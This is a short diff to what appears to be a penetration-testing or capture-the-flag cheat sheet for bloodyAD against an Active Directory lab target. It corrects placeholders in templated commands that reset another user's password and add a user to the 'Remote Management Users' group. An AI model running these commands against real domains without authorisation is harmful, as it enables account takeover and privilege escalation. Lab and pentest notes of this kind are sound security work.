@@ -11,12 +11,12 @@ bloodyAD --host "dc01.vintage.htb" -d "vintage.htb" --kerberos --dc-ip 10.129.19
 #### Change Users Password
 
 ```bash
-bloodyAD -d domain.local --host x.x.x.x -u username -p username set password target_user new_password
+bloodyAD -d domain.local --host x.x.x.x -u username -p password set password target_user new_password
 ```
 #### Add User to a group
 
 ```bash
-bloodyAD -d domain.local --host x.x.x.x -u username -p username add groupMember 'Remote Management Users' user_to_add
+bloodyAD -d domain.local --host x.x.x.x -u username -p password add groupMember 'Remote Management Users' user_to_add
 ```
 #### Add GenericAll to a user account
 
